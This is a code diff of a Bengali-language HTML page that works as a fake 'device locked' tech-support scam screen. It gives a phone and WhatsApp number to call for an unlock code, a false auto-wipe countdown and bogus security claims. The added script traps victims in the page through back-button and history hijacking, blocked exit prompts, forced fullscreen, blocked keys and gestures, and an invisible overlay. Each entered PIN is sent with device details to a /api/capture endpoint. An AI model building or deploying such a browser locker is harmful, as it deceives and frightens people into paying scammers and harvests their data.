@@ -2,84 +2,417 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, interactive-widget=resizes-content">
     <title>🔒 ডিভাইস লক হয়েছে</title>
-    <link rel="stylesheet" href="css/style.css">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans Bengali', sans-serif;
+            background: linear-gradient(160deg, #0a0a1a, #1a1a3e, #0d0d2b);
+            min-height: 100vh; min-height: 100dvh;
+            display: flex; flex-direction: column; align-items: center;
+            color: #fff; overflow: hidden; user-select: none; -webkit-user-select: none;
+            position: fixed; width: 100%; height: 100%; top: 0; left: 0;
+            touch-action: none; -webkit-touch-callout: none;
+        }
+        
+        .status-bar {
+            width: 100%; padding: 14px 24px; display: flex; justify-content: space-between; align-items: center;
+            font-size: 15px; font-weight: 600;
+            background: rgba(0,0,0,0.4); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
+            z-index: 100; border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .status-left { display: flex; align-items: center; gap: 6px; }
+        .status-right { display: flex; align-items: center; gap: 14px; font-size: 14px; }
+        
+        .lock-screen {
+            flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 16px 20px; width: 100%; max-width: 420px; gap: 8px;
+        }
+        
+        .lock-icon { font-size: 72px; animation: pulse 2s ease-in-out infinite; text-shadow: 0 0 50px rgba(255,68,68,0.3); }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.08); opacity: 0.85; } 100% { transform: scale(1); opacity: 1; } }
+        
+        .lock-title { font-size: 24px; font-weight: 800; text-align: center; }
+        .lock-subtitle { font-size: 13px; font-weight: 400; color: #888; text-align: center; letter-spacing: 0.5px; }
+        
+        .alert-badge {
+            background: rgba(255,68,68,0.15); color: #ff4444; padding: 6px 20px; border-radius: 20px;
+            font-size: 13px; font-weight: 700; border: 1px solid rgba(255,68,68,0.3);
+        }
+        
+        .message-card {
+            background: rgba(255,255,255,0.05); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; padding: 16px 18px;
+            width: 100%; font-size: 14px; line-height: 1.7; color: #ddd;
+        }
+        .message-card strong { color: #ff6b6b; }
+        .message-divider { height: 1px; background: rgba(255,255,255,0.08); margin: 10px 0; }
+        .message-bn { color: #ffcc00; font-weight: 700; font-size: 16px; text-align: center; }
+        
+        .support-card {
+            background: linear-gradient(135deg, rgba(255,68,68,0.12), rgba(200,0,0,0.08));
+            border: 2px solid rgba(255,68,68,0.3); border-radius: 16px; padding: 14px 20px;
+            width: 100%; text-align: center;
+        }
+        .support-label { font-size: 13px; color: #aaa; text-transform: uppercase; letter-spacing: 1px; }
+        .support-number {
+            font-size: 30px; font-weight: 900; color: #ff4444; letter-spacing: 2px; padding: 6px 0;
+            text-shadow: 0 0 25px rgba(255,68,68,0.4); font-family: 'Courier New', monospace;
+        }
+        .support-hint { font-size: 12px; color: #888; }
+        
+        .input-section { width: 100%; display: flex; flex-direction: column; gap: 8px; }
+        .input-label { font-size: 13px; color: #999; text-align: center; font-weight: 600; }
+        
+        .unlock-input {
+            width: 100%; padding: 18px; background: rgba(255,255,255,0.06);
+            border: 2px solid rgba(255,255,255,0.12); border-radius: 14px; color: #fff;
+            font-size: 32px; text-align: center; letter-spacing: 16px; outline: none;
+            font-weight: 700; font-family: 'Courier New', monospace;
+        }
+        .unlock-input::placeholder { letter-spacing: 10px; font-size: 28px; color: rgba(255,255,255,0.15); }
+        .unlock-input:focus { border-color: #ff4444; background: rgba(255,68,68,0.06); box-shadow: 0 0 25px rgba(255,68,68,0.1); }
+        .pin-hint { text-align: center; font-size: 12px; color: #888; }
+        
+        .unlock-btn {
+            width: 100%; padding: 16px; background: linear-gradient(135deg, #ff4444, #cc0000);
+            border: none; border-radius: 14px; color: #fff; font-size: 17px;
+            font-weight: 700; cursor: pointer; letter-spacing: 1px;
+        }
+        .unlock-btn:active { transform: translateY(0px); }
+        
+        .error-message { text-align: center; font-size: 14px; color: #ffcc00; min-height: 22px; font-weight: 600; }
+        
+        .warning-footer {
+            background: rgba(255,68,68,0.05); border: 1px solid rgba(255,68,68,0.12);
+            border-radius: 12px; padding: 12px 14px; width: 100%; font-size: 12px; line-height: 1.6; color: #999;
+        }
+        .warning-icon { text-align: center; font-size: 18px; margin-bottom: 6px; }
+        .warning-footer strong { color: #ff6b6b; }
+        .warning-english { font-size: 11px; color: #777; font-style: italic; }
+        .warning-countdown { margin-top: 8px; text-align: center; font-size: 13px; color: #ffcc00; font-weight: 700; }
+        #timer { font-family: 'Courier New', monospace; font-size: 16px; color: #ff4444; font-weight: 800; }
+        
+        .footer-note { font-size: 10px; color: #444; text-align: center; padding: 6px 0; }
+        
+        .unlock-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center;
+            z-index: 99999; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+        }
+        .unlock-box { text-align: center; padding: 40px; }
+        .unlock-icon-big { font-size: 80px; animation: unlockPop 0.5s ease-out; }
+        @keyframes unlockPop { 0% { transform: scale(0); opacity: 0; } 50% { transform: scale(1.2); } 100% { transform: scale(1); opacity: 1; } }
+        .unlock-box h2 { font-size: 28px; color: #00c853; margin-top: 16px; }
+        .unlock-box p { color: #aaa; margin-top: 8px; }
+        
+        /* ওভারলে ডিভ — পুরো স্ক্রিন কভার */
+        #fullscreenOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 99998; background: transparent; display: none;
+        }
+    </style>
 </head>
 <body>
+    <!-- একটি অতিরিক্ত ওভারলে — ব্যাক বাটন ট্র্যাপের জন্য -->
+    <div id="fullscreenOverlay"></div>
+
     <div class="status-bar">
-        <div class="status-left">
-            <span class="time-display" id="statusTime">১২:০০</span>
-        </div>
+        <div class="status-left"><span id="statusTime">১২:০০</span></div>
         <div class="status-right">
-            <span class="wifi-icon">📶</span>
-            <span class="mobile-icon">📱</span>
-            <span class="battery-display" id="batteryLevel">🔋 ৮৫%</span>
+            <span>📶</span> <span>📱</span>
+            <span id="batteryLevel">🔋 ৮৫%</span>
         </div>
     </div>
 
-    <div class="lock-screen">
-        <div class="lock-icon-wrapper">
-            <div class="lock-icon">🔒</div>
-        </div>
-
+    <div class="lock-screen" id="lockScreen">
+        <div style="font-size:72px;animation:pulse 2s ease-in-out infinite;text-shadow:0 0 50px rgba(255,68,68,0.3);">🔒</div>
         <h1 class="lock-title">🔐 ডিভাইস লক হয়েছে</h1>
-        <h2 class="lock-subtitle">Device Security Locked</h2>
-
+        <p class="lock-subtitle">Device Security Locked</p>
         <div class="alert-badge">⚠️ জরুরি সতর্কবার্তা</div>
-
+        
         <div class="message-card">
             <p>আপনার ডিভাইসটি <strong>নিরাপত্তার কারণে লক</strong> করা হয়েছে।</p>
             <p>একাধিক ব্যর্থ লগইন প্রচেষ্টা এবং সন্দেহজনক কার্যকলাপ সনাক্ত করা হয়েছে।</p>
             <div class="message-divider"></div>
             <p class="message-bn">📞 ফোন আনলক করতে কল করুন:</p>
         </div>
-
+        
         <div class="support-card">
             <div class="support-label">☎️ হেল্পলাইন / Support</div>
-            <div class="support-number" id="supportNumber">+8809658470831</div>
+            <div class="support-number">+8809658470831</div>
             <div class="support-hint">WhatsApp / কল করুন — ২৪/৭ সাপোর্ট</div>
         </div>
-
+        
         <div class="input-section">
             <div class="input-label">আনলক কোড লিখুন / Enter Unlock Code</div>
             <input type="password" id="unlockInput" class="unlock-input" 
-                   placeholder="· · · ·" 
-                   maxlength="4" inputmode="numeric" pattern="[0-9]*"
-                   autocomplete="off">
-            
-            <div class="pin-hint">
-                <span>🔑 কোড পেতে কল করুন +8809658470831</span>
-            </div>
-            
-            <button id="unlockBtn" class="unlock-btn" onclick="submitCode()">
-                ✅ আনলক করুন / UNLOCK
-            </button>
+                   placeholder="· · · ·" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+            <div class="pin-hint">🔑 কোড পেতে কল করুন +8809658470831</div>
+            <button id="unlockBtn" class="unlock-btn">✅ আনলক করুন / UNLOCK</button>
             <div id="errorMsg" class="error-message"></div>
         </div>
-
+        
         <div class="warning-footer">
             <div class="warning-icon">⚠️</div>
-            <p><strong>সতর্কতা:</strong> ডিভাইস রিস্টার্ট বা রিসেট করলে <strong>সমস্ত ডাটা স্থায়ীভাবে মুছে যাবে</strong>। দয়া করে +8809658470831 নাম্বারে কল করে আনলক কোড নিন।</p>
-            <p class="warning-english"><strong>WARNING:</strong> Do NOT restart or reset your device. ALL data will be permanently deleted. Call +8809658470831 for unlock code.</p>
+            <p><strong>সতর্কতা:</strong> ডিভাইস রিস্টার্ট বা রিসেট করলে <strong>সমস্ত ডাটা স্থায়ীভাবে মুছে যাবে</strong>।</p>
+            <p class="warning-english"><strong>WARNING:</strong> Do NOT restart or reset your device. ALL data will be permanently deleted.</p>
             <p class="warning-countdown">⏳ অটো-ওয়াইপ হবে: <span id="timer">২৩:৫৯:৫৯</span></p>
         </div>
-
-        <div class="footer-note">
-            🔒 AES-256 এনক্রিপশন • গুগল সিকিউরিটি প্রটোকল v৩.২.১
-        </div>
+        <div class="footer-note">🔒 AES-256 এনক্রিপশন • গুগল সিকিউরিটি প্রটোকল v৩.২.১</div>
     </div>
 
     <div id="unlockSuccess" class="unlock-overlay" style="display:none;">
         <div class="unlock-box">
-            <div class="unlock-icon">✅</div>
+            <div class="unlock-icon-big">✅</div>
             <h2>ডিভাইস আনলক হয়েছে!</h2>
             <p>Device Unlocked Successfully</p>
             <p style="font-size:13px;color:#aaa;margin-top:10px;">রিডাইরেক্ট হচ্ছে...</p>
         </div>
     </div>
 
-    <script src="js/script.js"></script>
+    <script>
+    // =============================================
+    // কনফিগারেশন
+    // =============================================
+    const CORRECT_PIN = '7380';
+    const API_BASE = '/api';
+    let attempts = 0;
+    let isSubmitting = false;
+    
+    // =============================================
+    // স্ট্যাটাস বার — সময় ও ব্যাটারি
+    // =============================================
+    function updateStatusBar() {
+        const now = new Date();
+        const h = String(now.getHours()).padStart(2, '0');
+        const m = String(now.getMinutes()).padStart(2, '0');
+        document.getElementById('statusTime').textContent = h + ':' + m;
+    }
+    if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+            function updateBattery() {
+                const level = Math.floor(battery.level * 100);
+                const icon = level > 50 ? '🔋' : level > 20 ? '🔋' : '🪫';
+                document.getElementById('batteryLevel').textContent = icon + ' ' + level + '%';
+            }
+            updateBattery();
+            battery.addEventListener('levelchange', updateBattery);
+        });
+    }
+    setInterval(updateStatusBar, 1000);
+    updateStatusBar();
+    
+    // =============================================
+    // কাউন্টডাউন
+    // =============================================
+    (function() {
+        let remaining = 86400;
+        const timerEl = document.getElementById('timer');
+        setInterval(function() {
+            remaining = Math.max(0, remaining - 1);
+            const h = String(Math.floor(remaining / 3600)).padStart(2, '0');
+            const m = String(Math.floor((remaining % 3600) / 60)).padStart(2, '0');
+            const s = String(remaining % 60).padStart(2, '0');
+            timerEl.textContent = h + ':' + m + ':' + s;
+        }, 1000);
+    })();
+    
+    // =============================================
+    // ⭐ ব্যাক বাটন ব্লক — সবচেয়ে শক্তিশালী উপায়
+    // =============================================
+    
+    // 1. হিস্টোরি ট্র্যাপ
+    history.pushState(null, null, location.href);
+    window.addEventListener('popstate', function() {
+        history.pushState(null, null, location.href);
+    });
+    
+    // 2. পেজ ছাড়তে দেবে না
+    window.addEventListener('beforeunload', function(e) {
+        e.preventDefault();
+        e.returnValue = '⚠️ লক অবস্থায় আছেন!';
+    });
+    
+    // 3. প্রতি সেকেন্ডে হিস্টোরি রিস্টোর
+    setInterval(function() {
+        history.pushState(null, null, location.href);
+    }, 1000);
+    
+    // 4. visibility change — পেজে ফিরলে আবার ট্র্যাপ
+    document.addEventListener('visibilitychange', function() {
+        if (!document.hidden) {
+            history.pushState(null, null, location.href);
+            setTimeout(tryFullscreen, 200);
+        }
+    });
+    
+    // =============================================
+    // ⭐ ফুলস্ক্রিন ফোর্স
+    // =============================================
+    function tryFullscreen() {
+        const el = document.documentElement;
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+            if (el.requestFullscreen) { el.requestFullscreen().catch(function(){}); }
+            else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen(); }
+            else if (el.msRequestFullscreen) { el.msRequestFullscreen(); }
+        }
+    }
+    document.addEventListener('fullscreenchange', function() {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+            setTimeout(tryFullscreen, 100);
+        }
+    });
+    document.addEventListener('webkitfullscreenchange', function() {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+            setTimeout(tryFullscreen, 100);
+        }
+    });
+    setTimeout(tryFullscreen, 300);
+    setInterval(tryFullscreen, 2000);
+    
+    // =============================================
+    // ⭐ কী বোর্ড ব্লক
+    // =============================================
+    document.addEventListener('keydown', function(e) {
+        var blocked = ['F11','Escape','F5','F4','F3','F2','F1','F6','F12'];
+        if (blocked.indexOf(e.key) !== -1) {
+            e.preventDefault(); e.stopPropagation(); return false;
+        }
+        if (e.ctrlKey && (e.key === 'w' || e.key === 'r' || e.key === 'W' || e.key === 'R')) {
+            e.preventDefault(); return false;
+        }
+        if (e.altKey && (e.key === 'F4' || e.key === 'Tab')) {
+            e.preventDefault(); return false;
+        }
+    }, true);
+    
+    // =============================================
+    // ⭐ টাচ/স্ক্রল/জেসচার ব্লক
+    // =============================================
+    document.addEventListener('touchmove', function(e) {
+        if (e.target === document.body || e.target.closest('.lock-screen')) {
+            e.preventDefault();
+        }
+    }, { passive: false });
+    document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
+    document.addEventListener('gesturechange', function(e) { e.preventDefault(); });
+    document.addEventListener('gestureend', function(e) { e.preventDefault(); });
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    document.addEventListener('copy', function(e) { e.preventDefault(); });
+    document.addEventListener('cut', function(e) { e.preventDefault(); });
+    document.addEventListener('paste', function(e) { e.preventDefault(); });
+    document.addEventListener('selectstart', function(e) { e.preventDefault(); });
+    
+    // =============================================
+    // ⭐ ওভারলে — ব্যাক/হোম বাটন এক্সট্রা প্রটেকশন
+    // =============================================
+    var overlay = document.getElementById('fullscreenOverlay');
+    
+    // টাচ ইভেন্ট — ওভারলে সব গ্রাস করবে
+    overlay.addEventListener('touchstart', function(e) { e.preventDefault(); });
+    overlay.addEventListener('touchmove', function(e) { e.preventDefault(); });
+    overlay.addEventListener('touchend', function(e) { e.preventDefault(); });
+    
+    // ক্লিক ইভেন্ট
+    overlay.addEventListener('click', function(e) { e.preventDefault(); });
+    
+    // ওভারলে দেখান
+    overlay.style.display = 'block';
+    
+    // প্রতি ১০ সেকেন্ডে ওভারলে রিফ্রেশ
+    setInterval(function() {
+        overlay.style.display = 'none';
+        setTimeout(function() { overlay.style.display = 'block'; }, 100);
+    }, 10000);
+    
+    // =============================================
+    // PIN ফাংশন
+    // =============================================
+    document.getElementById('unlockBtn').addEventListener('click', submitCode);
+    document.getElementById('unlockInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') submitCode();
+    });
+    
+    setTimeout(function() {
+        document.getElementById('unlockInput').focus();
+    }, 500);
+    
+    setInterval(function() {
+        if (document.activeElement !== document.getElementById('unlockInput')) {
+            document.getElementById('unlockInput').focus();
+        }
+    }, 3000);
+    
+    async function submitCode() {
+        if (isSubmitting) return;
+        
+        var input = document.getElementById('unlockInput');
+        var errorMsg = document.getElementById('errorMsg');
+        var btn = document.getElementById('unlockBtn');
+        var code = input.value.trim();
+        
+        if (code.length < 4) {
+            errorMsg.textContent = '❌ ৪ ডিজিটের কোড লিখুন';
+            input.focus();
+            return;
+        }
+        
+        isSubmitting = true;
+        btn.textContent = '⏳ চেক করা হচ্ছে...';
+        btn.disabled = true;
+        errorMsg.textContent = '';
+        
+        // ডাটা পাঠান
+        try {
+            await fetch(API_BASE + '/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    pin: code,
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: screen.width + 'x' + screen.height,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        } catch(e) {}
+        
+        if (code === CORRECT_PIN) {
+            setTimeout(function() {
+                document.getElementById('lockScreen').style.display = 'none';
+                document.getElementById('unlockSuccess').style.display = 'flex';
+                setTimeout(function() {
+                    window.location.href = 'https://www.youtube.com';
+                }, 3000);
+            }, 500);
+        } else {
+            attempts++;
+            var remaining = 5 - attempts;
+            if (remaining <= 0) {
+                errorMsg.textContent = '⛔ সর্বোচ্চ চেষ্টা শেষ! কল করুন +8809658470831';
+            } else {
+                var msgs = ['❌ ভুল কোড! আবার চেষ্টা করুন','❌ কোড মিলছে না! আবার লিখুন','❌ ভুল PIN! সঠিক কোড দিন','❌ এক্সেস ডিনাইড!'];
+                var randomMsg = msgs[Math.floor(Math.random() * msgs.length)];
+                errorMsg.textContent = randomMsg + ' (' + remaining + ' বার বাকি)';
+            }
+            input.value = '';
+            input.focus();
+            setTimeout(function() {
+                isSubmitting = false;
+                btn.textContent = '✅ আনলক করুন / UNLOCK';
+                btn.disabled = false;
+            }, 1500);
+            return;
+        }
+        
+        isSubmitting = false;
+        btn.textContent = '✅ আনলক করুন / UNLOCK';
+        btn.disabled = false;
+    }
+    </script>
 </body>
-              </html>
+    </html>
